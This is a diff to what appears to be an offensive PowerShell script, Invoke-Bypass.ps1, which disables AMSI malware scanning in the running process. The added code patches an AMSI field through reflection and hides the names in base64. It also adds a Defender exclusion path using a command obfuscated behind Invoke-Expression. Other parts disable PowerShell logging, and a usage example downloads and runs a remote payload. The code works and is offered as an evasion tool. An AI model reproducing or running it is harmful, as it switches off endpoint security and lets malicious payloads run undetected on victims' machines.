@@ -3,10 +3,10 @@
    Disable AMS1 within current process.
 
    Author: @r00t-3xp10it
-   Tested Under: Windows 10 (19042) x64 bits
+   Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: Assembly {native}
    Optional Dependencies: IWR {native}
-   PS cmdlet Dev version: v1.1.10
+   PS cmdlet Dev version: v1.1.11
 
 .DESCRIPTION
    This cmdlet attempts to disable AMS1 string scanning within
@@ -49,11 +49,11 @@
    Bypass ams1 detection on current proccess and execute payload.ps1
 
 .EXAMPLE
-   PS C:\> .\Invoke-Bypass.ps1 -technic "2" -filepath "payload.ps1" -fileargs "-action 'true'"
+   PS C:\> .\Invoke-Bypass.ps1 -technic "3" -filepath "payload.ps1" -fileargs "-action 'true'"
    Bypass ams1 detection on current proccess and execute payload.ps1 with arguments (parameters)
 
 .EXAMPLE
-   PS C:\> .\Invoke-Bypass.ps1 -technic "2" -payloadUrl "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1" -fileargs "-sysinfo enum"
+   PS C:\> .\Invoke-Bypass.ps1 -technic "4" -payloadUrl "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1" -fileargs "-sysinfo enum"
    Bypass ams1 detection on current proccess and download\execute sysinfo.ps1 with arguments ( -sysinfo enum )
 
 .EXAMPLE
@@ -92,7 +92,7 @@
 )
 
 
-$cmdletVersion = "v1.1.10"
+$cmdletVersion = "v1.1.11"
 #Cmdlet Global variable declarations
 $ErrorActionPreference = "SilentlyContinue"
 #Disable Powershell Command Logging for current session.
@@ -126,6 +126,7 @@ If($List -iMatch "^(technic|technics)$")
    write-host "  1        PS`V2_DO`WNGR`ADE"
    write-host "  2        FORC`E_AM`SI_ERROR"
    write-host "  3        AM`SI_UT`ILS_P`AT`CH"
+   write-host "  4        AM`SI_UT`ILS_BAS`E64"
    write-host ""
    write-host "* " -ForegroundColor Green -NoNewline;
    write-host "Syntax examples:" -ForegroundColor DarkGray
@@ -145,21 +146,6 @@ write-host "$Technic" -ForegroundColor DarkYellow -NoNewline;
 write-host "] .." -ForegroundColor DarkGray
 Start-Sleep -Milliseconds 500
 
-
-function Invoke-AmsiChecks ()
-{echo "running"
-   $DeObfuscOne = (([regex]::Matches("'de'+'liaFt'+'inIism'+'a'",'.','RightToLeft')|ForEach{$_.value}) -join '')
-   $DeObfuscTwo = (([regex]::Matches("'slit'+'UismA.noi'+'tamotuA.tnem'+'eganaM.me'+'tsyS'",'.','RightToLeft')|ForEach{$_.value}) -join '')
-   If($([bool](([Ref].Assembly.GetType($DeObfuscOne).GetField($DeObfuscTwo,'Non'+'Public,St'+'atic').GetValue($null)))))
-   {
-      $AmsiState = "String detection DISABLE on console!"
-   }
-   Else
-   {
-      $AmsiState = "String detection ENABLE on console!"
-   }
-}
-
 If($ExcludeLocation -ne "false")
 {
 
@@ -176,8 +162,11 @@ If($ExcludeLocation -ne "false")
    $bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
    If($bool)
    {
+      $Obfusca = "Set-Mp@Pr"+"efe@ren@ce -Ex@cl@u"+"sio@nPa"+"@th $ExcludeLocation -force"
+      $Deobfuscated = $Obfusca -replace '@',''
       $MakeSure = $ExcludeLocation.Split('\')[-1]
-      Set-MpPreference -ExclusionPath "$ExcludeLocation" -Force
+      $Deobfuscated|&('@ex' -replace '@','I')
+
       If((Get-MpPreference).ExclusionPath -iMatch "($MakeSure)$")
       {
          write-host "  + " -ForegroundColor DarkYellow -NoNewline;
@@ -313,6 +302,27 @@ ElseIf($Technic -eq 3)
       $i0Stream = $Bitmap.GetField($Graphics,"$ComponentDeviceId,Static");$i0Stream.SetValue($null,$true)
    }Catch{Throw $_}
 }
+ElseIf($Technic -eq 4)
+{
+
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Disclosure: @Unknown
+      Helper - AM`SI_UT`ILS_BAS`E64
+   #>
+
+   $Disclosure = "@Unknown"
+   $TechnicName = "AM`SI_UT`ILS_BAS`E64"
+
+   Try{#Ams1 bypass technic n 4
+      [Ref].Assembly.GetType($('Syst'+'em.Manag'+'ement.Autom'+'ation.')+$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBtAHMAaQA=')))+
+      $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VQB0AGkAbABzAA==')))).GetField($([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('YQBtAHMAaQA='))+
+      $([System.Text.Encoding]::Unicode.GetString($([System.Convert]::FromBase64String('SQBuAGkAdAA='))))+
+      $([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgBhAGkAbABlAGQA')))),$('NonPublic,Static')).SetValue($null,$true)
+   }Catch{Throw $_}
+}
+
 
 
 If($?)
